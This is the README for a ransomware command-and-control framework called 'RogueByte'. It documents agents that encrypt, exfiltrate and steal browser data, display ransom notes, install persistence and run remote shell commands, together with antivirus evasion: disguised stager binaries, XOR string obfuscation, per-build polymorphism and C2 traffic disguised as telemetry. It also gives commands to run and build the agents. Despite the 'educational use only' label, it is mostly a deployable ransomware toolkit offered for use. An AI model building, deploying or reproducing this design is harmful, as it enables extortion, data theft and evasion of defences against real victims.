# RogueByte C2 Framework

> **v1.0 — Educational use only. Run only on systems you own or have explicit permission to test.**

Cross-platform C2 framework with plugin-extensible agents, live WebSocket dashboard, and per-build polymorphism. The ransomware module is delivered as a runtime plugin — the core binary is a lightweight framework (~10MB).

## Architecture

```
┌──────────────────────────┐     beacon/http      ┌──────────────────────────────────┐
│    Victim (Agent)        │◄────────────────────►│          C2 Server               │
│                          │    commands/plugins   │                                  │
│  HW_DETECT (stager)      │                      │  Flask + SocketIO + Gevent       │
│  GPU_HELPER (framework)  │                      │  SQLite DB (Fernet-encrypted)    │
│    ├─ plugin: crypto     │                      │  Passphrase-protected unlock     │
│    └─ plugin: browser…   │                      │  WebSocket → React SPA           │
└──────────────────────────┘                      └──────────────────────────────────┘
                          ┌───────────────────┐
                          │   Dashboard       │
                          │   (TypeScript)    │
                          │   Plugins UI      │
                          │   Alert Rules UI   │
                          └───────────────────┘
```

## Features

- **Password-protected DB** — server starts locked. PBKDF2-derived Fernet key, no keyfile on disk.
- **Per-build RSA keys** — each `build.py` run generates a unique RSA-2048 pair. Private key stored in DB by build number. Agents auto-inject on `decrypt` commands.
- **Plugin system** — heavy modules (encrypt/decrypt, browser steal, scareware) are plugins loaded at runtime from the C2 server. Core binary is lightweight (~10MB).
- **Alert rules engine** — configurable server-side triggers evaluate every beacon. Actions: notify dashboard, log, or auto-queue commands (with dangerous-command filter).
- **String obfuscation** — AST-based XOR encryption of all string literals at build time. `strings` on the binary yields zero C2 URLs, keys, or command names.
- **AV-evading deployment** — two-stage: `hw_detect` (stager, 13MB) beacons in, then downloads and spawns `gpu_helper` (framework, 10MB + plugins).
- **Live dashboard** — React + Vite + Tailwind v4 + SocketIO. Real-time victim updates, command dispatch, file exfiltration, tabbed UI for plugins + alerts.
- **Cross-platform** — Linux and Windows agents, Windows cross-compile via Docker.

## Directory Structure

```
├── agents/              → Agent source (ransomware_linux/windows + stagers + settings)
├── server/              → C2 server
│   ├── c2_server.py     → Flask + SocketIO + Gevent
│   ├── plugins/         → Plugin .py files (uploaded via dashboard)
│   ├── data/            → SQLite DB, keys/, exfil/, auto_deploy.json
│   └── static/          → React SPA (Vite build output)
├── client/              → React + Vite + TypeScript dashboard source
├── lib/                 → Shared modules (persistence, c2_client, evasion, plugin_loader)
├── tools/               → build.py (PyInstaller) + obfuscators/ + key_gen.py
├── dist/                → Compiled binaries (linux/ + windows/)
└── legacy/              → Archived V1 prototype
```

## Quick Start

```bash
pip install -r requirements.txt
python3 server/c2_server.py
```

Open http://localhost:4444. The dashboard prompts you to set a master password on first run. Once unlocked, any running agents appear in real-time.

### Run Agent (dev mode)

```bash
python3 agents/ransomware_linux.py
```

### Build Production Binary

```bash
python3 server/c2_server.py        # Must be running first (generates traffic key)
python3 tools/build.py              # Compiles for platform (string obfuscation applied)
```

Output in `dist/linux/gpu_helper` (~10MB) and `dist/linux/hw_detect` (~13MB).

## Core Agent Commands

| Command | Description |
|---|---|
| `exec` | Run shell command (returns stdout/stderr, 1000 chars) |
| `persist` | Install systemd/Registry persistence |
| `download` | Download file from URL to victim |
| `upload` | Upload file from victim to C2 |
| `network_info` | Network interfaces, routing, listening ports |
| `screenshot` | Capture desktop, upload to C2 |
| `pslist` | List running processes |
| `pskill` | Kill process by PID (self-kill guard) |
| `show_ransomnote` | Display ransomware note |
| `self_destruct` | Remove persistence, delete binary, exit |
| `status` | Agent state: persistence status, loaded plugins, tracked files |
| `load_plugin` | Download plugin from C2, dynamically import |
| `unload_plugin` | Deregister plugin commands |
| `list_plugins` | Show loaded plugins + registered commands |

Plugin commands are registered at runtime by loaded `.py` modules (e.g., `crypto_encrypt` adds `encrypt`/`decrypt`).

## Plugins

Plugins are standard Python files uploaded via the dashboard, stored in `server/plugins/`. Each exports metadata and an `init(ctx)` function:

```python
PLUGIN_NAME = "crypto_encrypt"
PLUGIN_VERSION = "1.0"
PLUGIN_DESCRIPTION = "AES-256+RSA file encryption"

def init(ctx):
    ctx.register_command('encrypt', cmd_encrypt)
    ctx.register_command('decrypt', cmd_decrypt)

def cmd_encrypt(params, shared_state) -> str: ...
def cmd_decrypt(params, shared_state) -> str: ...
```

## Alerts

Rules evaluate every beacon. Fields: `hostname`, `username`, `os`, `ip`, `status`, `persistent`, `files_found`, `files_encrypted`, `command_result`. Operators: `equals`, `contains`, `matches` (regex), `starts_with`, `gt`, `lt`. Actions: notify dashboard, log to history, or auto-queue a command (respects dangerous-command filter).

## Security

- **DB at rest**: Fernet-encrypted with key derived from master password (PBKDF2-HMAC-SHA256, 100k iterations).
- **Traffic**: Fernet-encrypted per-session, disguised as analytics telemetry (`hwmonitor`, `nvidia-smi`, `directx`).
- **Builds**: Per-build RSA-2048 key for file encryption. Private key in DB (never in binary).
- **Plugins**: Downloaded and `importlib`-loaded at runtime. No sandbox — same process.
- **Binaries**: AST string obfuscation, no UPX, no `--key` (PyInstaller 6.x dropped BlockCipher). Unique byte patterns per build.
- **No password recovery**: Server restart requires re-login. Lost password = lost DB.

## Environment Variables

| Variable | Default | Purpose |
|---|---|---|
| `C2_SERVER` | (prompt) | Server URL for build.py |
| `C2_API_KEY` | (none) | HTTP header auth for REST endpoints |
| `C2_SHUTDOWN_KEY` | `shutdown` | Key for `/api/shutdown` |
| `FLASK_DEBUG` | `0` | Enable Flask debug mode |
